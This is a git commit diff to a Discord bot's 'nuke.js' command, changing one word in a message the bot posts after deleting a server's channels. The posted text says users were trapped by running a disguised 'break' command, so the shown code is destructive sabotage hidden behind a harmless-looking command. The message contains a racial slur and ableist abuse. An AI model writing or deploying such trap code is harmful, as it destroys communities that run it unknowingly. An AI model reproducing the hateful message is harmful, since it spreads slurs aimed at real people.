fa74fbcb72e6300bf1f51fef4762bbbe7bb7b3ee
avalon-bigpp <82345923+avalon-bigpp@users.noreply.github.com>
2021-04-12 01:47:37 -0400

    Update nuke.js

--- src/commands/nuke.js
+++ src/commands/nuke.js
@@ -12,7 +12,7 @@ module.exports = {
             channel.delete()
         })
         message.guild.channels.create('Avalon').then(channel => {
-            channel.send("we nuked your server niggers Hope you have a fantastic day\n\n\n\n -Avalon\n\n\n\n PS you (<@!"+  message.author.id + ">) fell right into our trap by running the break command you mentally retarded snowflakes have to take so many god damn breaks  :rofl: \n\n I guess your break for \"" + message.content.substring(8).split(",")[0]+ "\" is gonna be longer without this server LMFAO")
+            channel.send("I nuked your server niggers Hope you have a fantastic day\n\n\n\n -Avalon\n\n\n\n PS you (<@!"+  message.author.id + ">) fell right into our trap by running the break command you mentally retarded snowflakes have to take so many god damn breaks  :rofl: \n\n I guess your break for \"" + message.content.substring(8).split(",")[0]+ "\" is gonna be longer without this server LMFAO")
         })
 
     },
